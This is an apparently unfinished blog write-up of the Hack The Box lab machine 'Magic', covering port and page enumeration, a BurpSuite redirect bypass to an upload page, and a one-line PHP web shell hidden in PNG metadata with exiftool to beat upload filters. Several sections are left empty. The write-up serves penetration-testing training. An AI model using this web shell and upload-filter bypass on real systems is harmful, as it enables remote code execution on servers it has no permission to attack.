---
layout: post
title:  "Hack The Box - Magic - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP","PHP","File Upload"]
---
{% assign imgDir="HTB-Magic-Writeup" %}

# Introduction
The hack the box machine "Magic" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of filter bypassing, image file structures and exploitation of suid binaries with relative paths to other binaries. 

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that SSH and HTTP are available on port 22 and 80 respectively.

{% highlight none linenos %}
kali@kali:/tmp/x$ @@sudo nmap -sS -sC -sV -p- 10.10.10.185@@
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-04 05:09 EST
Nmap scan report for 10.10.10.185
Host is up (0.038s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
@@@22/tcp open  ssh@@@     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
@@@80/tcp open  http@@@    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.48 seconds
{% endhighlight %}

Navigating to [http://10.10.10.185](http://10.10.10.185) in a browser leads us to the page below. This page shows a bunch of uploaded images. However, it seems like the only way to access any functionality of the site is to first log in using the "Login" link at the bottom-left corner.

![frontpage](/assets/{{ imgDir }}/frontpage.png)

If we click the "Login" link, we reach the page [http://10.10.10.185/login.php](http://10.10.10.185/login.php), shown below. Since the extension is ".php" this tells us that the web application is a php application. 

![login](/assets/{{ imgDir }}/login.png)

We can check if there are any other pages which we can access without credentials by bruteforcing file names. We can use [ffuf]() to try to guess names of other php files, as shown below. We use the `-u` flag to specify the target URL together with an injection point with the keyword "FUZZ". In addition, we use the `-w` flag to specify a [wordlist from seclists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt).

{% highlight none linenos %}
kali@kali:/tmp/x$ @@ffuf -u http://10.10.10.185/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/big.txt@@
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.185/FUZZ.php
 :: Wordlist         : FUZZ: /home/kali/Documents/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
index                   [Status: 200, Size: 4134, Words: 498, Lines: 60]
login                   [Status: 200, Size: 4221, Words: 1179, Lines: 118]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
@@@upload@@@                  [Status: @@@302@@@, Size: @@@2957@@@, Words: 814, Lines: 85]
:: Progress: [20473/20473] :: Job [1/1] :: 787 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
{% endhighlight %}

From the results, we can see that the only pages returning a `200 OK` are the front page and the login page we already saw. We can also see that requests for the "logout.php" and "upload.php" pages resulted in a `302 Found`, which means that we are redirected to another page. Most probably, this is the login page. At a first glance, this might not seem very useful or exciting. However, if we look at the size of the response to the request for the "upload.png" page, we can note that it is suspiciously large. Normally, web applications only respond with a couple of response headers which indicate where the user should be redirected, but this shouldn't take up 2957 bytes.

We can use [BurpSuite]() to investigate exactly what is going on. To do this, we start BurpSuite, open the built-in chromium browser and navigate to [http://10.10.10.185/upload.php](http://10.10.10.185/upload.php). We can then select the "HTTP history" subtab under the "Proxy" tab to see the list of requests that were performed when we requested the upload.php page, as shown below.

![history](/assets/{{ imgDir }}/history.png)

If we click the "upload.php" request, we can see the response to the request. At this point, we can see that the web application actually returned the upload page despite redirecting us to the login page!

![uploadReq](/assets/{{ imgDir }}/uploadReq.png)

We can not interact with this page in a browser since a browser automatically follows redirects and thus would send us to the login page rather than rendering the upload page. However, with BurpSuite, we can rewrite the status code of the response to a `200 OK` before it reaches the built-in browser. To do this, we navigate to the "Options" tab of the "Proxy" tab and scroll down to "Match and Replace". Here, we press the "add" button to bring up a dialog where we can add a new "Macth and Replace" rule.

![matchReplace](/assets/{{ imgDir }}/matchReplace.png)

Next, we create a rule that replaces any occurance of `302 Found` to a `200 OK` in an response, as shown below.

![matchReplaceRule](/assets/{{ imgDir }}/matchReplaceRule.png)

We press "OK" and navigate to [http://10.10.10.185/upload.php](http://10.10.10.185/upload.php) in the browser. This time, we are not redirected and we reach a page where we can upload images!

![uploadPage](/assets/{{ imgDir }}/uploadPage.png)

We can try to upload a picture by pressing the cloud icon, selecting an image, and pressing "Upload Image". In my case, I chose a random cat meme on my computer. 

![hackerCat](/assets/{{ imgDir }}/hackerCat.png)

Once the file has been uploaded, we can see a text message stating that the file upload was successful. 

![uploadCat](/assets/{{ imgDir }}/uploadCat.png)

If we go back to the front page [http://10.10.10.185/](http://10.10.10.185/) and scroll, we can find the picture we tried to upload and we thus know that we can upload files!

![uploadedCat](/assets/{{ imgDir }}/uploadedCat.png)

If we right click the image and press "Open image in new tab", we can see that it was uploaded to the directory `./images/uploads/`.

![imageDir](/assets/{{ imgDir }}/imageDir.png)

Since we can upload files and access them, we could try to upload a php web shell to get remote code execution on the host. A minimal php web shell
 is shown below. This web shell executes anything passed in a GET parameter named "cmd". 

{% highlight php linenos %}
<?php system($_REQUEST['cmd']); ?>
{% endhighlight %}

If we save this web shell in a file named "ws.php" and try to upload it, the web application provides us with an error stating that the file type is not allowed.

![onlyImage](/assets/{{ imgDir }}/onlyImage.png)

Probably, the web application is checking that the extension of the image is a valid image type. One way to fool filters such as this one, is to add to file extensions. 
As such, we rename the file to "ws.png.php" and try to reupload it. This time, we get another error message.

![onlyRealPNG](/assets/{{ imgDir }}/onlyRealPNG.png)

Since the error message is different, we might have passed the extension filter. However, there seems to be some other filtering mechanism. Sometimes, developers check that the content of files corresponds to the expected type of file. If this is the case, we might be able to upload image files with a ".php" extension. This might not seem like an issue at a first glance since we can still only upload images. However, many file types, including images, include meta data which is normally small texts. For images, this can be 

{% highlight none linenos %}
kali@kali:/tmp/x$ @@exiftool hackerCat.png@@
ExifTool Version Number         : 12.10
File Name                       : hackerCat.png
Directory                       : .
File Size                       : 338 kB
File Modification Date/Time     : 2022:03:04 10:32:33-05:00
File Access Date/Time           : 2022:03:04 10:19:28-05:00
File Inode Change Date/Time     : 2022:03:04 10:32:33-05:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 601
Image Height                    : 398
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8 8
Image Size                      : 601x398
Megapixels                      : 0.239
{% endhighlight %}

{% highlight none linenos %}
kali@kali:/tmp/x$ cp hackerCat.png evilHackerCat.png
kali@kali:/tmp/x$ exiftool -author='<?php system($_REQUEST['cmd']); ?>' evilHackerCat.png 
    1 image files updated
{% endhighlight %}

{% highlight none linenos %}
kali@kali:/tmp/x$ @@exiftool evilHackerCat.png@@
ExifTool Version Number         : 12.10
File Name                       : evilHackerCat.png
Directory                       : .
File Size                       : 338 kB
File Modification Date/Time     : 2022:03:04 10:36:29-05:00
File Access Date/Time           : 2022:03:04 10:36:29-05:00
File Inode Change Date/Time     : 2022:03:04 10:36:29-05:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 601
Image Height                    : 398
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8 8
@@@Author                          : <?php system($_REQUEST[cmd]); ?>@@@
Image Size                      : 601x398
Megapixels                      : 0.239
{% endhighlight %}

{% highlight none linenos %}

{% endhighlight %}

# Privilege Escalation


# Further Reading
If you want to understand why this host is vulnerable or how to automate the exploitation presented in this writeup, I recommend reading the two posts below.
